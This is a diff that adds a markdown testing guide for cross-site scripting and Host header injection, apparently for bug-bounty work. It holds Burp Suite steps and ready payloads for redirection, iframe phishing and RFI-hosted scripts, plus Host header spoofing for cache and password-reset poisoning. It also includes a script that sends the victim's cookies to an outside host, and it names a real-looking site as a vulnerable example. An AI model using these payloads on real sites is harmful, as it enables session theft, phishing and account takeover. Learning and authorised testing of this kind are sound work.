@@ -206,3 +206,165 @@ Payload:
 - [Prompt.ml](https://prompt.ml/)
 
 ---
+# XSS & Host Header Injection Testing Guide
+
+## 1. First SDIPER Application
+- Sort out the parameters.
+- Check one by one → Send to repeater → Use payloads (`hello1`, `hello2`).
+- If `hello2` is reflecting, try scripts or brute-force attacks.
+- Sort the maximum length of the first 10 results, then show the response in the browser.
+
+### Payload Naming:
+- Use `xss.txt` for payloads or manually set a payload.
+- Manual testing is better for stored XSS vulnerabilities.
+
+## 2. Brute-Force Attack Considerations
+- If you want to stop URL encoding, go for payload encoding.
+- Uncheck URL encoding for better results.
+
+## 3. XSS Through Header Injection
+- Capture the request using **Burp Suite**.
+- Add a `Referer` field below the `Host` in the header.
+- Send it to the repeater:
+  ```
+  Host: abc.com
+  Referer: hello
+  ```
+- If `hello` is reflecting, use the following payload:
+  ```html
+  <script>alert(1)</script>
+  ```
+
+## 4. URL Redirection
+- Instead of `alert(1)`, use URL redirection.
+- If it redirects to `bing.com`, it is vulnerable.
+  ```html
+  <script>document.location.href="http://bing.com"</script>
+  ```
+  Example vulnerable URL:
+  ```
+  http://www.woodlandwordwide.com/wnew.faces/tiles/page/search.jsp?searchkey=<script>document.location.href="http://bing.com"</script>
+  ```
+
+## 5. Phishing via XSS
+- Instead of `alert(1)`, use an iframe:
+  ```html
+  <iframe src="http://bing.com" height="100%" width="100%"></iframe>
+  ```
+
+## 6. Cookie Stealing via XSS
+- Victim's website transfers cookies to the attacker's site:
+  ```html
+  <script>document.location.href="http://bing.com/p/?page="+document.cookie</script>
+  ```
+
+## 7. XSS Through File Uploading
+### Method 1:
+- The `file_name` parameter is reflecting in the **view-source** (e.g., `abc.jpeg`).
+- Attack by injecting scripts into the filename.
+- Use **Intruder** with common payloads.
+
+### Method 2:
+- Upload a file containing an XSS script.
+- Access the file to trigger the payload.
+
+## 8. XSS Through RFI Vulnerability
+- If an application has RFI vulnerability, host an XSS script on the attacker's server:
+  ```
+  http://10.10.11.24/xss.html  # Contains XSS payload
+  ```
+- Execute via a vulnerable endpoint:
+  ```
+  http://abc.com/cmn/js/ajax.php?url=http://10.10.11.24/xss.html
+  ```
+
+## 9. Self-XSS to Reflected XSS
+- Copy the vulnerable **HTML response** from Burp Suite.
+- Save it as an HTML file and open it in Firefox.
+- Instead of `alert(1)`, use:
+  ```html
+  document.location.href="http://bing.com"
+  ```
+- Example:
+  ```
+  /@213dewf it is reflecting in browser → add XSS script:
+  /@213dewf"><script>alert(1)</script>
+  ```
+
+## 10. Blind XSS Vulnerability
+- Use **Hunter** for detection.
+
+---
+
+# Host Header Injection
+## 1. Overview
+- Exploiting host header injection in **virtual hosting environments**.
+- Can lead to **web cache poisoning, XSS, password reset poisoning, and internal host access**.
+
+## 2. Attack Methods
+### Method 1:
+```http
+Host: bing.com
+```
+### Method 2:
+```http
+Host: bing.com
+X-Forwarded-Host: realweb.com
+```
+### Method 3:
+```http
+Host: realweb.com
+X-Forwarded-Host: bing.com
+```
+### Method 4:
+```http
+Referer: https://www.bing.com/
+```
+
+## 3. Host Header Injection with Web Cache Poisoning
+- Follow the above methods.
+- Click anywhere on the web application.
+- If redirected to `bing.com`, the site is vulnerable.
+
+## 4. Password Reset Poisoning
+- Obtain a **password reset link**.
+- Modify the `Host` header.
+
+## 5. Host Header Attack for XSS
+- Check if the response contains:
+  ```html
+  https://bing.com/?locald">
+  ```
+- Use the payload:
+  ```html
+  Host: bing.com"><script>alert(1)</script>
+  ```
+
+## 6. Host Header Injection on Referer Header
+- Modify headers:
+  ```http
+  Connection: close
+  Referer: https://www.bing.com/
+  ```
+
+## 7. Subdomain-Based Host Header Injection
+- Use existing and non-existing subdomains to inject headers.
+
+## 8. Advanced Host Header Attacks
+### Internal Host Access:
+```http
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+```
+
+---
+
+## Summary
+This guide provides a structured approach to performing **XSS** and **Host Header Injection** attacks for security testing. Make sure to test responsibly and only on applications you have permission to test.
+
+---
+
+#### ⚠️ Disclaimer
+This content is for **educational and ethical hacking** purposes only. Unauthorized testing without proper consent is illegal.
